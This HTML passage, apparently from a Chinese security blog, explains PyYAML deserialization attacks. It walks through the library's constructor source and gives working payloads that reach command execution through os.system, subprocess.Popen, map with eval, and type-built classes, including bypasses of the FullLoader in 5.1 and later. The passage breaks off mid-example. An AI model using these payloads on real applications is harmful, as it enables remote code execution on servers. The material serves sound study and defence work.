href="#PyYAML-lt-5-1" class="headerlink" title="PyYAML &lt; 5.1"></a>PyYAML &lt; 5.1</h2><p>PyYAML 的利用划分以版本 5.1 为界限，5.1以下利用相对较简单，5.1以上利用相对稍麻烦</p><p>&lt;5.1的版本中一共有三个构造器，分别是</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">BaseConstructor：最最基础的构造器，不支持强制类型转换<br>SafeConstructor：集成 BaseConstructor，强制类型转换和 YAML 规范保持一致，没有魔改<br>Constructor：在 YAML 规范上新增了很多强制类型转换，是默认使用的构造器<br></code></pre></td></tr></table></figure><h3 id="python-x2F-object-x2F-apply"><a href="#python-x2F-object-x2F-apply" class="headerlink" title="python&#x2F;object&#x2F;apply"></a>python&#x2F;object&#x2F;apply</h3><p>construct_python_object_apply</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object_apply</span>(<span class="hljs-params">self, suffix, node, newobj=<span class="hljs-literal">False</span></span>):<br>        <span class="hljs-comment"># Format:</span><br>        <span class="hljs-comment">#   !!python/object/apply       # (or !!python/object/new)</span><br>        <span class="hljs-comment">#   args: [ ... arguments ... ]</span><br>        <span class="hljs-comment">#   kwds: &#123; ... keywords ... &#125;</span><br>        <span class="hljs-comment">#   state: ... state ...</span><br>        <span class="hljs-comment">#   listitems: [ ... listitems ... ]</span><br>        <span class="hljs-comment">#   dictitems: &#123; ... dictitems ... &#125;</span><br>        <span class="hljs-comment"># or short format:</span><br>        <span class="hljs-comment">#   !!python/object/apply [ ... arguments ... ]</span><br>        <span class="hljs-comment"># The difference between !!python/object/apply and !!python/object/new</span><br>        <span class="hljs-comment"># is how an object is created, check make_python_instance for details.</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(node, SequenceNode):<br>            args = self.construct_sequence(node, deep=<span class="hljs-literal">True</span>)<br>            kwds = &#123;&#125;<br>            state = &#123;&#125;<br>            listitems = []<br>            dictitems = &#123;&#125;<br>        <span class="hljs-keyword">else</span>:<br>            value = self.construct_mapping(node, deep=<span class="hljs-literal">True</span>)<br>            args = value.get(<span class="hljs-string">&#x27;args&#x27;</span>, [])<br>            kwds = value.get(<span class="hljs-string">&#x27;kwds&#x27;</span>, &#123;&#125;)<br>            state = value.get(<span class="hljs-string">&#x27;state&#x27;</span>, &#123;&#125;)<br>            listitems = value.get(<span class="hljs-string">&#x27;listitems&#x27;</span>, [])<br>            dictitems = value.get(<span class="hljs-string">&#x27;dictitems&#x27;</span>, &#123;&#125;)<br>        <span class="hljs-comment"># 调用 make_python_instance 获取模块中的方法并执行</span><br>        instance = self.make_python_instance(suffix, node, args, kwds, newobj)<br>        <span class="hljs-keyword">if</span> state:<br>            self.set_python_instance_state(instance, state)<br>        <span class="hljs-keyword">if</span> listitems:<br>            instance.extend(listitems)<br>        <span class="hljs-keyword">if</span> dictitems:<br>            <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dictitems:<br>                instance[key] = dictitems[key]<br>        <span class="hljs-keyword">return</span> instance<br></code></pre></td></tr></table></figure><p>调用 make_python_instance 获取模块中的方法并执行</p><p><img src="/img/summary/python_unserialize-11.png"></p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># short format形式</span><br><span class="hljs-comment"># !!python/object/apply [ ... arguments ... ]</span><br>yaml.load(<span class="hljs-string">&#x27;!!python/object/apply:os.system [&quot;whoami&quot;]&#x27;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [&#x27;whoami&#x27;]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:os.system [whoami]&quot;</span>)<br>yaml.load(<span class="hljs-string">&quot;!!python/object/apply:subprocess.Popen [&#x27;whoami&#x27;]&quot;</span>)<br><br><br><span class="hljs-comment"># 其他几种表现形式</span><br>yaml.load(<span class="hljs-string">&quot;exp: !!python/object/apply:os.system [whoami]&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  args: [&quot;whoami&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><span class="hljs-comment"># command 是 os.system 的参数名(可以通过help(os.system)查看)</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">exp: !!python/object/apply:os.system</span><br><span class="hljs-string">  kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/apply:os.system</span><br><span class="hljs-string">- whoami</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h3 id="python-x2F-object-x2F-new"><a href="#python-x2F-object-x2F-new" class="headerlink" title="python&#x2F;object&#x2F;new"></a>python&#x2F;object&#x2F;new</h3><p>对应的 construct_python_object_new 只有一行代码，调用了construct_python_object_apply</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object_new</span>(<span class="hljs-params">self, suffix, node</span>):<br>    <span class="hljs-keyword">return</span> self.construct_python_object_apply(suffix, node, newobj=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>唯一不同的是newobj参数不一样，这个参数影响了 make_python_instance 中的一个判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>    <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> cls(*args, **kwds)<br></code></pre></td></tr></table></figure><p>基本不影响，所以 python&#x2F;object&#x2F;new 和 python&#x2F;object&#x2F;apply 可以看作是同一个</p><h3 id="python-x2F-object"><a href="#python-x2F-object" class="headerlink" title="python&#x2F;object"></a>python&#x2F;object</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_object</span>(<span class="hljs-params">self, suffix, node</span>):<br>    <span class="hljs-comment"># Format:</span><br>    <span class="hljs-comment">#   !!python/object:module.name &#123; ... state ... &#125;</span><br>    instance = self.make_python_instance(suffix, node, newobj=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">yield</span> instance<br>    deep = <span class="hljs-built_in">hasattr</span>(instance, <span class="hljs-string">&#x27;__setstate__&#x27;</span>)<br>    state = self.construct_mapping(node, deep=deep)<br>    self.set_python_instance_state(instance, state)<br></code></pre></td></tr></table></figure><p>执行 make_python_instance 时并没有传 args 或 kwds 参数，所以只能执行无参函数</p><p>例如</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.name = <span class="hljs-string">&quot;&quot;</span><br><br><br>payload1 = <span class="hljs-string">&quot;&quot;&quot;!!python/object:__main__.User</span><br><span class="hljs-string">name: aaa</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>payload2 = <span class="hljs-string">&quot;!!python/object:__main__.User &#123;name: aaa&#125;&quot;</span><br><br>data1 = yaml.load(payload1)<br><span class="hljs-built_in">print</span>(data1.name)<br><br>data2 = yaml.load(payload2)<br><span class="hljs-built_in">print</span>(data2.name)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">aaa</span><br><span class="hljs-string">aaa</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h3 id="python-x2F-module"><a href="#python-x2F-module" class="headerlink" title="python&#x2F;module"></a>python&#x2F;module</h3><p>代码中只调用了 find_python_module 来导入模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_module</span>(<span class="hljs-params">self, suffix, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">if</span> value:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python module&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected the empty value, but found %r&quot;</span> % value, node.start_mark)<br>    <span class="hljs-keyword">return</span> self.find_python_module(suffix, node.start_mark)<br></code></pre></td></tr></table></figure><p>虽然 construct_python_module 没有调用逻辑，但是与任意文件上传搭配有奇效</p><p>比如在upload目录下上传了恶意文件exp.py</p><p><img src="/img/summary/python_unserialize-12.png"></p><p>就可以用<code>!!python/module:upload.exp</code>来导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br>yaml.load(<span class="hljs-string">&#x27;!!python/module:upload.exp&#x27;</span>)<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">root</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>一个小技巧：<br>当文件名是 __init__.py 时，直接导入目录名即可，可以绕过.的限制</p><h3 id="python-x2F-name"><a href="#python-x2F-name" class="headerlink" title="python&#x2F;name"></a>python&#x2F;name</h3><p>代码逻辑与 python&#x2F;module 非常相似，不过module只返回模块，而name返回模块下的属性和方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">construct_python_name</span>(<span class="hljs-params">self, suffix, node</span>):<br>    value = self.construct_scalar(node)<br>    <span class="hljs-keyword">if</span> value:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python name&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected the empty value, but found %r&quot;</span> % value, node.start_mark)<br>    <span class="hljs-keyword">return</span> self.find_python_name(suffix, node.start_mark)<br></code></pre></td></tr></table></figure><p>这个特性常用在获取未知变量的值上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br>key = <span class="hljs-string">&quot;k1y.....&quot;</span><br><br>config = <span class="hljs-string">&#x27;!!python/name:__main__.key&#x27;</span><br><span class="hljs-built_in">print</span>(yaml.load(config))<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">k1y.....</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="PyYAML-gt-x3D-5-1"><a href="#PyYAML-gt-x3D-5-1" class="headerlink" title="PyYAML &gt;&#x3D; 5.1"></a>PyYAML &gt;&#x3D; 5.1</h2><p>新增的<br>1：FullConstructor：默认的构造器。<br>2：UnsafeConstructor：支持全部的强制类型转换<br>3：Constructor：等同于 UnsafeConstructor</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">__all__ = [<br>    <span class="hljs-string">&#x27;BaseConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;SafeConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;FullConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;UnsafeConstructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;Constructor&#x27;</span>,<br>    <span class="hljs-string">&#x27;ConstructorError&#x27;</span><br>]<br></code></pre></td></tr></table></figure><p>如果指定的构造器是 UnsafeConstructor 或者 Constructor ，那么直接用&lt;5.1的方法打就好了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.unsafe_load(exp)<br>yaml.unsafe_load_all(exp)<br>yaml.load(exp, Loader=Loader)<br>yaml.load(exp, Loader=UnsafeLoader)<br>yaml.load_all(exp, Loader=Loader)<br>yaml.load_all(exp, Loader=UnsafeLoader)<br></code></pre></td></tr></table></figure><h3 id="默认构造器下的利用方式"><a href="#默认构造器下的利用方式" class="headerlink" title="默认构造器下的利用方式"></a>默认构造器下的利用方式</h3><p>这里以 PyYAML&#x3D;&#x3D;5.1 为例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_python_instance</span>(<span class="hljs-params">self, suffix, node,</span><br><span class="hljs-params">        args=<span class="hljs-literal">None</span>, kwds=<span class="hljs-literal">None</span>, newobj=<span class="hljs-literal">False</span>, unsafe=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> args:<br>        args = []<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> kwds:<br>        kwds = &#123;&#125;<br>    cls = self.find_python_name(suffix, node.start_mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>)):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python instance&quot;</span>, node.start_mark,<br>                <span class="hljs-string">&quot;expected a class, but found %r&quot;</span> % <span class="hljs-built_in">type</span>(cls),<br>                node.start_mark)<br>    <span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>        <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> cls(*args, **kwds)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_python_name</span>(<span class="hljs-params">self, name, mark, unsafe=<span class="hljs-literal">False</span></span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;expected non-empty name appended to the tag&quot;</span>, mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        module_name, object_name = name.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        module_name = <span class="hljs-string">&#x27;builtins&#x27;</span><br>        object_name = name<br>    <span class="hljs-keyword">if</span> unsafe:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-built_in">__import__</span>(module_name)<br>        <span class="hljs-keyword">except</span> ImportError <span class="hljs-keyword">as</span> exc:<br>            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                    <span class="hljs-string">&quot;cannot find module %r (%s)&quot;</span> % (module_name, exc), mark)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules:<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;module %r is not imported&quot;</span> % module_name, mark)<br>    module = sys.modules[module_name]<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(module, object_name):<br>        <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">&quot;while constructing a Python object&quot;</span>, mark,<br>                <span class="hljs-string">&quot;cannot find %r in the module %r&quot;</span><br>                % (object_name, module.__name__), mark)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, object_name)<br></code></pre></td></tr></table></figure><p>可以看到引入了 unsafe ，并且有如下的规则</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>))<br><span class="hljs-comment">#  module.name 必须是一个类</span><br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> module_name <span class="hljs-keyword">in</span> sys.modules<br><span class="hljs-comment"># 限制了导入的module必须在 sys.modules 中</span><br></code></pre></td></tr></table></figure><p><strong>方法一：</strong></p><p>最简单的方式就是遍历 sys.modules 字典，找一个满足条件的模块中能执行命令的类</p><p>比如 subprocess.Popen</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.load(<span class="hljs-string">&quot;!!python/object/apply:subprocess.Popen [whoami]&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>方法二：</strong></p><p>借助 map 来触发函数执行</p><p>例如<code>map(eval, [&quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot;])</code></p><blockquote><p>需要注意在python2中会直接返回结果，但是在python3中返回的就是一个map对象，需要用一些函数来遍历</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># python3</span><br><span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">set</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">frozenset</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br><span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>]))<br></code></pre></td></tr></table></figure><p>转换成yaml格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml<br><br><span class="hljs-comment"># python2</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br><br><span class="hljs-comment"># python3</span><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:tuple</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:frozenset</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br>yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:bytes</span><br><span class="hljs-string">- !!python/object/new:map</span><br><span class="hljs-string">  - !!python/name:eval</span><br><span class="hljs-string">  - [&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;]</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br><br></code></pre></td></tr></table></figure><p>这里存在一个问题，在使用<code>!!python/object/new</code>的情况下只能使用 tuple，bytes 等函数来遍历map对象，用 list 或者 set 都不行（当然在 !!python&#x2F;object&#x2F;apply 下没有问题）</p><p>这是因为上文提到的 python&#x2F;object&#x2F;new 与 python&#x2F;object&#x2F;apply 的不同之处导致的</p><p>当调用 construct_python_object_apply 时会使 newobj 为 true，那么条件就成立了，就会调用 cls.__new__(cls, *args, **kwds)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> newobj <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>):<br>    <span class="hljs-keyword">return</span> cls.__new__(cls, *args, **kwds)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> cls(*args, **kwds)<br></code></pre></td></tr></table></figure><p>因为这几个函数的底层实现并不相同，所以部分函数不能使用 __new__ 来传值</p><p><img src="/img/summary/python_unserialize-13.png"></p><p><strong>其他方法：</strong></p><p>继续看 !!python&#x2F;object&#x2F;new 的代码，可以发现除了调用 make_python_instance 外还有三个判断，这三个判断在之前的payload中并没有使用，因为并没有传对应的值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> state:<br>    self.set_python_instance_state(instance, state)<br><span class="hljs-keyword">if</span> listitems:<br>    instance.extend(listitems)<br><span class="hljs-keyword">if</span> dictitems:<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> dictitems:<br>        instance[key] = dictitems[key]<br></code></pre></td></tr></table></figure><p>首先是当 listitems 存在，就会触发 instance 下的 extend 方法。那么我们可以创建一个类，在类中添加一个名为 extend 的方法，然后重写成 eval，就相当于 instance.eval(listitems)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 利用 type 创建一个新的类</span><br>a = <span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;rce&quot;</span>, (), &#123;<span class="hljs-string">&quot;extend&quot;</span>: <span class="hljs-built_in">eval</span>&#125;)<br>a.extend(<span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span>)<br></code></pre></td></tr></table></figure><p>转成YAML</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">yaml.full_load(<span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">!!python/object/new:type</span><br><span class="hljs-string">args:</span><br><span class="hljs-string">  - rce</span><br><span class="hljs-string">  - !!python/tuple []</span><br><span class="hljs-string">  - &#123;&quot;extend&quot;: !!python/name:eval &#125;</span><br><span class="hljs-string">listitems: &quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;</span><br><span class="hljs-string">&quot;&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/summary/python_unserialize-14.png"></p><p>state 的利用方式也是同样的，通过修改 <code>__setstate__</code> 达到执行函数的目的（与pickle中的利用__setstate__执行命令类似）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 